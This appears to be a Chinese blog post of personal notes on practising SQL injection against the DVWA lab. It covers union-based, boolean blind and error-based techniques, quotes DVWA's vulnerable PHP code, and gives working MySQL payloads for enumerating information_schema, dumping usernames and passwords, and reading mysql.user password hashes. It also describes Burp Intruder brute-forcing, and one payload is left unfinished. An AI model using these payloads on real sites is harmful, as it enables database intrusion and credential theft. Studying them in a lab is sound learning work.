---
title: 渗透学习记录OS
date: 2022-12-25 22:58:29
categories: "网络安全"
tags: "网安"
---


## mysql默认表相关知识

在 mysql5 版本以后，mysql 默认在数据库中存放在一个叫 `infomation_schema` 里面 这个库里面有很多表 重点是这三个表 `columns 、tables、SCHEMATA` 表字段 CHEMA_NAME 记录着库的信息



columns 存储该用户创建的所有数据库的库名、标名和字段名。

## union联合注入攻击原理

> 步骤一：联合两表
>
> ​	1.union语句要求字段数一样才可以执行，所以我们要先进行字段判断
>
> 常见方法：
>
> ```mysql
> SELECT * FROM `users` WHERE user_id=1 order by 8
> ```
>
> 判断出字段数为8
>
> 然后通过
>
> ```mysql
> SELECT * FROM `users` WHERE user_id=1 union SELECT 1,2,3,4,5,6,7,8
> ```
>
> 进行联合查询

联合查询后面的语句

```mysql
SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT 1,2,user()
```

select后面的数字可以替换成字段的名称或者函数

```mysql
-- 替换成mysql内置函数
SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user(),md5('a'),version()
```

```mysql 
-- 替换成mysql数据库里的字段
SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users
-- 也可以在语句后面加上limit限定显示的行数
SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 1

SELECT * FROM guestbook WHERE `comment_id`=1 union SELECT user_id,user,password from users limit 0,2
```

```mysql
-- 如果不想要第一个表里的数据 可以把1换成-1 因为默认负数就表示不存在的
SELECT * FROM guestbook WHERE `comment_id`=-1 union SELECT user_id,user,password from users limit 1
```

## union联合注入攻击分析

### 分析联合注入漏洞代码

首先我们先分析构成联合注入攻击的sql注入代码

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    #这里传入的参数没有进行过滤直接进入sql语句
    #从这里可以判断出id是字符串类型 所以在进行sql注入检测的时候要匹配字符
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        //显示查询成功后的内容
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

### 判断是否存在联合注入

​	我们先通过靶场查询id 如果在我们没进行源代码分析的基础上 我们首先需要进行数字和字符串判断 `1` 和`1‘` 判断出传入数据是字符串型 即存在注入漏洞

​	输入 1'and '1'='1 页面返回用户信息 1'and '1'='2 页面返回不一样的信息。基本可以确定存在 SQL 注入漏洞.

### 判断字段数

​	使用语句`order by`确定当前表的字符数

​	order by 1 如果页面返回正常 字段数不少于 1,order by 2 不少于 2，一直如此类推直到页面出错。正确的字段数是出错数字减少 1

公式 order by n-1

1' order by 1--+ 正常

1' order by 2--+ 正常

1' order by 3--+ 出错

正常页面 



### 联合查询注入获取敏感信息

​	跟前面咱们分析的一样，这里只是把查询的数据替换成了联合查询的语句 然后进行获取另一个表的字段或者函数

```mysql
 -1' union select user,password from users-- 
```

![](https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232138976-1882168286.png)


我们也可以使用`group_concat（）`函数来进行分组打印

```mysql
-1' union select 1,group_concat(user(),0x3A,version())-- 
```

![](https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232149753-1158385166.png)




### 联合查询注入通过information_schema

​	

在黑盒情况下我们是不知道当前数据库里都有哪些表的所以我们先从mysql的information_schema入手进行表的查询

第一个表：

这里的`database（）`函数是来限定查询的表是当前表

```mysql
-1' union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1)-- 
```

第二个表：

```mysql
-1' union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2)-- 
```

通过两个表的查询我们知道dvwa中含有的表为`guestbook` 和`users`



### 联合查询注入通过information_schema获取字段

我们知道数据库的字段都存在mysql默认内置库information_schema的columns里，所以我们想要获取当前数据库的字段名字我们可以通过

获取users表里的第一个字段名字 id 

```mysql
-1' union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 1)-- 
-- 注意这里一定要加上限定 因为你每次查询都是一个字段如果不加会报错
-- Subquery returns more than 1 row
```

获取第二个字段名字 password 

```mysql
-1' union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 2,1)-- 
```

获取第三个字段名字  email

```mysql
-1' union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 3,1)-- 
```

获取第四个字段名字 secret

```mysql
-1' union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 4,1)-- 
```

...............................

### 通过联合查询表里面的内容

​	通过以上操作我们已经获取了当前数据库的库名、表名、字段

那么我们就可以通过下面语句获取表里面的内容了

```mysql
-1' union select 1,(select group_concat(user,0x3a,password) from users limit 1)-- 
```





## boolean布尔型盲注入

### 代码分析

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    #id为字符串型 get接收id参数
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

接收 id 的值，直接带入查询，如果存在即返回 users is exists in the database

否则显示 users id is missing 像这种只有正确与错误页面。页面不会显示数据库

里任何内容，如果存在注入，成为盲注入。

​	盲注入的方法有两种：一是布尔型盲注入，二是延时注入

### 判断盲注入

​	我们可以通过`1' and '1'='1` 和 `1' and '1'='2` 是否一样 

​	以及 `1' and sleep(10)--`让他睡10s判断是否一样 



### Boolean布尔型注入攻击

​	因为页面不会返回查询的内容所以我们不能使用联合查询注入攻击，但是我们可以通过构造sql来获取数据。

​	

```mysql
1' and if(1=1,1,0)--  -- 三目运算
```



### 布尔型盲注入获取数据库敏感信息

​	在黑盒测试环境下，通过构造sql语句来进行获取敏感信息。

构造sql语句常用的函数：

1.`SUBSTRING()`字符串截取函数，第一个参数是字符串，第二个参数开始截取，第三个参数是截取的长度

我们可以构造这样的sql语句

```mysql
SELECT if(SUBSTRING(database(),1,1)='d',1,0)
```

如果截取的第一个字符是‘d’我们返回1 否则返回0

此类推。再后拼接字符就是完整的库名。



## 黑盒情况下进行布尔盲注入

步骤：

​	我们首先需要判断注入是否为布尔注入，判断完后就可以获取数据库的长度，得到长度再查询库名，然后查询表名，字段，字段内容。。。

### 布尔盲注入查询长度

​	通过构造如下sql语句进行数据库长度的查询

```mysql
1' and if(length(database())=4,1,0)-- 
```

判断出长度为4

### 布尔盲注入判断库名

这一步操作其实就是通过遍历

```
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_
```

与语句进行整合判断出是否返回1

```mysql
1' and if(SUBSTRING(database(),1,1)='$d',1,0)-- 
```

当然了，我们手动进行一个一个测试肯定很慢，那么我们可以借助burp来进行如此操作

带有构造sql语句的url

```
http://192.168.18.137/01/vulnerabilities/sqli_blind/?id=1%27%20and%20if(SUBSTRING(database(),1,1)=%27d%27,1,0)--%20&Submit=Submit#
```

再burp里面抓包然后送入intruder

先清除变量 然后再将数字和字母设为变量 攻击类型选择 `cluster bomb`

![](https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232208426-323266936.png)


然后就是payloads里面两个变量的设置 然后开始攻击就行 跑出来的状态码为200即为成功！

获得的数据库名为 dvwa

接着我们通过库名来获取表名

```
1' and if(SUBSTRING((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1),1,1)='g',1,0)-- 
```

同样通过burp进行抓包

![](https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232216969-1395888437.png)




获取到表名guestbook

然后获取字段名

```
1' and if(SUBSTRING((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 1,1),1,1)='l',1,0)-- 
```

同样我们用burp进行爆破

![](https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232228021-2082015114.png)


得到字段名为`login  password`等![](https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232302275-1126861267.png)


获得完

字段后 我们可以进一步获取字段内容【账号+密码】

```
1' and if(SUBSTRING((select CONCAT(user,0x3a,PASSWORD) from users limit 1),1,1)='a',1,0)-- 
```

![](https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232253962-1018686498.png)







## 报错注入

​	顾名思义报错注入就是指数据库显示错误，比如sql语法错误

一般对于php。特别php 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。在 php 中 使用 `mysql_error()`函数

​	如果在查询注入时候会有报错信息返回，可以采用报错注入



### 报错注入分析

```php
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    # get传入id 字符串型
    $id = $_REQUEST[ 'id' ];

    // Check database
    # mysqli_error 函数返回错误信息
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```

### 报错注入攻击

​	在输入框输入报错的sql拼接语句

```mysql
1' and info()-- 
```

它的原理是下面一条语句会执行但是会报错，在报错信息中会返回数据库名称

```mysql
SELECT first_name,last_name from users WHERE user_id='1' and info()
```

### 报错注入获取敏感信息

​	通过构造sql语句，返回带有数据库敏感信息的错误信息

```mysql
1' and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- 
```

注意：这里为什么要用`updatexml()`呢，首先要先了解这个函数

> updatexml(xml_doument,XPath_string,new_value)
> 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
> 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
> 第三个参数：new_value，String格式，替换查找到的符合条件的数据

简单点说，这个函数有三个参数，我们利用第二个参数必须要更改信息的xpath语句来进行报错注入。

为什么要在第二个参数里面加上concat语句呢？因为updatexml（）第二个参数需要进行xpath校验，如果第二个参数哪里不是xpath语句它会进行一次校验然后把校验后的`错误信息返回`



> 但是采用 updatexml 报错函数 只能显示 32 长度的内容，如果获取的内容超过 32
>
> 字符就要采用字符串截取方法。每次获取 32 个字符串的长度。
>
> 除了 updatexml 函数支持报错注入外，mysql 还有很多函数支持报错。
>
> 例如：
>
> ```mysql
> 1.floor()
> select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2)) as x from information_schema.tables group by x)a);
> 2.extractvalue()
> select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
> 3.updatexml()
> select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
> 4.geometrycollection()
> select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
> 5.multipoint()
> select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));
> 6.polygon()
> select * from test where id=1 and polygon((select * from(select * from(select user())a)b));
> 7.multipolygon()
> select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));
> 8.linestring()
> select * from test where id=1 and linestring((select * from(select * from(select user())a)b));
> 9.multilinestring()
> select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));
> 10.exp()
> select * from test where id=1 and exp(~(select * from(select user())a));
> ```
>
> 





### 在黑盒模式下进行报错注入

​	流程还是根之前一样 库名-》表名-》字段-》字段内容

#### 获取库名	

```mysql
1' and (updatexml(1,(select concat('`',(select database()),'`')),1))-- 
```

#### 获取表名 这次用floor报错，floor报错不会出现长度问题

```mysql
1' and (select 1 from (select count(*),concat((select (select(select distinct concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=database() limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x)a)-- 
```

获取表名为 guestbook 将limit 0,1 改成 1，1是获取第二个表users

#### 获取字段

获取users第一个字段

```mysql
1' and (select 1 from(select count(*),,))
```





 获取账号密码

获取账号和密码需要root权限

```mysql
select authentication_string from mysql.user limit 1;
select(updatexml(1,concat(0x7e,(select (select authentication_string from mysql.user limit 1 )),0x7e),1))
select(updatexml(1,concat(0x7e,(select (substring((select authentication_string from mysql.user limit 1),32,40))),0x7e),1))
```


![](https://img2023.cnblogs.com/blog/2587631/202212/2587631-20221225232408409-1564081412.jpg)
